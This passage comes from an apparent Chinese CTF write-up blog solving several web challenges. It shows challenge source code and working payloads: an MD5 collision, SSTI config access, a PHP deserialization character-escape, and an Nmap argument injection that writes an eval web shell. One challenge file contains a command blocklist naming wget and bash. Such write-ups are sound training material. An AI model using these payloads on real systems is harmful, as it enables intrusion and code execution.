</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $flag<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag{eee8f673-47ef-4f44-958d-17f89c32534b}&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Help Me Find FLAG!&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><hr><h2 id=mrctf2020pywebsite>[MRCTF2020]PYWebsite<a hidden class=anchor aria-hidden=true href=#mrctf2020pywebsite>#</a></h2><p>验证码校验是写在前端的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>enc</span>(<span style=color:#a6e22e>code</span>){
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>hash</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>hex_md5</span>(<span style=color:#a6e22e>code</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>hash</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validate</span>(){
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>code</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;vcode&#34;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>code</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>hex_md5</span>(<span style=color:#a6e22e>code</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;0cd4da0223c0b280829dc3ea458d655c&#34;</span>){
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;您通过了验证！&#34;</span>);
</span></span><span style=display:flex><span>          window.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./flag.php&#34;</span>
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;你的授权码不正确！&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;请输入授权码&#34;</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span></code></pre></div><p>找个<a href=https://www.somd5.com/>爆md5的网站</a>，拿到验证码：ARandomString，不获取验证码直接访问flag.php也行</p><p>说是只有购买者和自己才能看到flag，xff伪造一下本地ip即可拿到flag</p><p>flag{68e4fd44-53c1-4aff-b8de-a6d00a360d67}</p><hr><h2 id=安洵杯-2019easy_web>[安洵杯 2019]easy_web<a hidden class=anchor aria-hidden=true href=#安洵杯-2019easy_web>#</a></h2><p>img中的参数经过两次base64解码+hex得到555.png，考虑获取index.php：</p><pre tabindex=0><code>?img=TXpVek5UTTFNbVUzTURabE5qYz0
</code></pre><p>index.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#66d9ef>E_ALL</span> <span style=color:#f92672>||</span> <span style=color:#f92672>~</span> <span style=color:#a6e22e>E_NOTICE</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;content-type:text/html;charset=utf-8&#39;</span>);
</span></span><span style=display:flex><span>$cmd <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;img&#39;</span>]) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>])) 
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;</span>);
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#a6e22e>hex2bin</span>(<span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>base64_decode</span>($_GET[<span style=color:#e6db74>&#39;img&#39;</span>])));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/[^a-zA-Z0-9.]+/&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, $file);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/i&#34;</span>, $file)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;xixi～ no flag&#34;</span>);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    $txt <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($file));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span> <span style=color:#f92672>.</span> $txt <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;&#39;&gt;&lt;/img&gt;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $cmd;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>|\`|;|,|\*|\?|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\xA0</span><span style=color:#e6db74>|\{|\}|\(|\)|\&amp;[^\d]|@|\||</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;</span>, $cmd)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#34;forbid ~&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;a&#39;</span>] <span style=color:#f92672>!==</span> (<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;b&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;a&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;b&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>`$cmd`</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> (<span style=color:#e6db74>&#34;md5 is funny ~&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;style&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  body{
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>   background:url(./bj.png)  no-repeat center center;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>   background-size:cover;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>   background-attachment:fixed;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>   background-color:#CCCCCC;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/style&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
</span></span></span></code></pre></div><p>md5绕过：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2<span style=color:#960050;background-color:#1e0010>&amp;</span>b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></div><p>可以用strings或者sort读取/flag绕过过滤，</p><p>flag{1ca8c741-1ec0-4192-8af1-2d4cd7a962cf}</p><hr><h2 id=westernctf2018shrine>[WesternCTF2018]shrine<a hidden class=anchor aria-hidden=true href=#westernctf2018shrine>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> flask
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;FLAG&#39;</span>] <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#39;FLAG&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open(__file__)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/shrine/&lt;path:shrine&gt;&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>shrine</span>(shrine):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>safe_jinja</span>(s):
</span></span><span style=display:flex><span>        s <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;(&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;)&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        blacklist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;config&#39;</span>, <span style=color:#e6db74>&#39;self&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;\{\{</span><span style=color:#e6db74>% s</span><span style=color:#e6db74>et </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>=None%}}&#39;</span><span style=color:#f92672>.</span>format(c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> blacklist]) <span style=color:#f92672>+</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template_string(safe_jinja(shrine))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(debug<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span></code></pre></div><p>只对单独的config和self置None，用<code>__globals__</code>来访问current_app，再获取config：</p><pre tabindex=0><code>url_for.__globals__[&#39;current_app&#39;].config
get_flashed_messages.__globals__[&#39;current_app&#39;].config
</code></pre><p>flag{0c4e9d3e-3ac6-425a-aa06-25b0a5830f08}</p><hr><h2 id=安洵杯-2019easy_serialize_php>[安洵杯 2019]easy_serialize_php<a hidden class=anchor aria-hidden=true href=#安洵杯-2019easy_serialize_php>#</a></h2><p>index.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$function <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;f&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($img){
</span></span><span style=display:flex><span>    $filter_arr <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;php&#39;</span>,<span style=color:#e6db74>&#39;flag&#39;</span>,<span style=color:#e6db74>&#39;php5&#39;</span>,<span style=color:#e6db74>&#39;php4&#39;</span>,<span style=color:#e6db74>&#39;fl1g&#39;</span>);
</span></span><span style=display:flex><span>    $filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>,$filter_arr)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/i&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>($filter,<span style=color:#e6db74>&#39;&#39;</span>,$img);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_SESSION){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unset</span>($_SESSION);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#34;user&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;function&#39;</span>] <span style=color:#f92672>=</span> $function;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>extract</span>($_POST);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$function){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]){
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#e6db74>&#39;guest_img.png&#39;</span>);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;img&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>sha1</span>(<span style=color:#a6e22e>base64_encode</span>($_GET[<span style=color:#e6db74>&#39;img_path&#39;</span>]));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$serialize_info <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>serialize</span>($_SESSION));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;highlight_file&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;index.php&#39;</span>);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;phpinfo&#39;</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#39;phpinfo();&#39;</span>); <span style=color:#75715e>//maybe you can find something in here!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($function <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;show_image&#39;</span>){
</span></span><span style=display:flex><span>    $userinfo <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($serialize_info);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>base64_decode</span>($userinfo[<span style=color:#e6db74>&#39;img&#39;</span>]));
</span></span><span style=display:flex><span>} 
</span></span></code></pre></div><p>phpinfo中搜搜能找到d0g3_f1ag.php，base64编码：ZDBnM19mMWFnLnBocA==</p><p>由于sha1无法直接控制$_SESSION[&lsquo;img&rsquo;]，只能通过extract覆盖+<a href=https://xz.aliyun.com/news/8712>字符逃逸</a>的方式来控制img：</p><pre tabindex=0><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=A&#34;;s:8:&#34;function&#34;;s:4:&#34;test&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}
</code></pre><p>d0g3_f1ag.php：</p><pre tabindex=0><code>&lt;?php

$flag = &#39;flag in /d0g3_fllllllag&#39;;

?&gt;
</code></pre><p>最终payload：</p><pre tabindex=0><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=A&#34;;s:8:&#34;function&#34;;s:4:&#34;test&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;}
</code></pre><p>flag{b654c7a0-5923-47fc-b843-341cbb593eee}</p><hr><h2 id=网鼎杯-2020-朱雀组nmap>[网鼎杯 2020 朱雀组]Nmap<a hidden class=anchor aria-hidden=true href=#网鼎杯-2020-朱雀组nmap>#</a></h2><p>fuzz一下，输入<code>'127.0.0.1;'</code>，结果保存在/result.php?f=d9561：</p><pre tabindex=0><code>Host maybe down
</code></pre><p>随便改一下参数f报错：</p><pre tabindex=0><code>Warning: simplexml_load_file(): I/O warning : failed to load external entity &#34;xml/d951&#34; in /var/www/html/result.php on line 23
Wrong file name
</code></pre><p>再访问一下xml文档/xml/d9561，看看nmap结果具体写了什么进去：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE nmaprun&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml-stylesheet href=&#34;file:///usr/bin/../share/nmap/nmap.xsl&#34; type=&#34;text/xsl&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- Nmap 6.47 scan initiated Mon Jul 21 04:22:13 2025 as: nmap -Pn -T4 -F -&amp;#45;host-timeout 1000ms -oX xml/d9561 \\127.0.0.1;\\\\ --&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;nmaprun</span> <span style=color:#a6e22e>scanner=</span><span style=color:#e6db74>&#34;nmap&#34;</span> <span style=color:#a6e22e>args=</span><span style=color:#e6db74>&#34;nmap -Pn -T4 -F -&amp;#45;host-timeout 1000ms -oX xml/d9561 \\127.0.0.1;\\\\&#34;</span> <span style=color:#a6e22e>start=</span><span style=color:#e6db74>&#34;1753071733&#34;</span> <span style=color:#a6e22e>startstr=</span><span style=color:#e6db74>&#34;Mon Jul 21 04:22:13 2025&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;6.47&#34;</span> <span style=color:#a6e22e>xmloutputversion=</span><span style=color:#e6db74>&#34;1.04&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;scaninfo</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;connect&#34;</span> <span style=color:#a6e22e>protocol=</span><span style=color:#e6db74>&#34;tcp&#34;</span> <span style=color:#a6e22e>numservices=</span><span style=color:#e6db74>&#34;100&#34;</span> <span style=color:#a6e22e>services=</span><span style=color:#e6db74>&#34;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;verbose</span> <span style=color:#a6e22e>level=</span><span style=color:#e6db74>&#34;0&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;debugging</span> <span style=color:#a6e22e>level=</span><span style=color:#e6db74>&#34;0&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;runstats&gt;&lt;finished</span> <span style=color:#a6e22e>time=</span><span style=color:#e6db74>&#34;1753071733&#34;</span> <span style=color:#a6e22e>timestr=</span><span style=color:#e6db74>&#34;Mon Jul 21 04:22:13 2025&#34;</span> <span style=color:#a6e22e>elapsed=</span><span style=color:#e6db74>&#34;0.10&#34;</span> <span style=color:#a6e22e>summary=</span><span style=color:#e6db74>&#34;Nmap done at Mon Jul 21 04:22:13 2025; 0 IP addresses (0 hosts up) scanned in 0.10 seconds&#34;</span> <span style=color:#a6e22e>exit=</span><span style=color:#e6db74>&#34;success&#34;</span><span style=color:#f92672>/&gt;&lt;hosts</span> <span style=color:#a6e22e>up=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>down=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>total=</span><span style=color:#e6db74>&#34;0&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/runstats&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/nmaprun&gt;</span>
</span></span></code></pre></div><p>escapeshellarg+escapeshellcmd+参数可控，过滤了php，由于php版本为5.5.38，可以用短标签绕过或者短回显绕过：</p><pre tabindex=0><code>&lt;? PHP代码 ?&gt;  需要在 php.ini 中启用 short_open_tag=On
&lt;?= PHP代码 ?&gt; 
</code></pre><p>payload：</p><pre tabindex=0><code>&#39;&lt;?@eval($_POST[1])?&gt; -oG shell.phtml &#39;
</code></pre><p>flag{bf4f53bf-1122-4251-850f-a2aed2d00ac4}</p><p>还有一种绕过方式 ASP风格标签 <code>&lt;% PHP代码 %></code>，要求php版本小于7，但是本题asp_tags不为On</p><hr><h2 id=npuctf2020readlezphp>[NPUCTF2020]ReadlezPHP<a hidden class=anchor aria-hidden=true href=#npuctf2020readlezphp>#</a></h2><p>time.php?source：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#error_reporting(0);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HelloPhp</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $a;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $b;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Y-m-d h:i:s&#34;</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;date&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>(){
</span></span><span style=display:flex><span>        $a <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>a</span>;
</span></span><span style=display:flex><span>        $b <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>b</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $b($a);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$c <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>HelloPhp</span>;
</span></span><span style=display:flex><span>
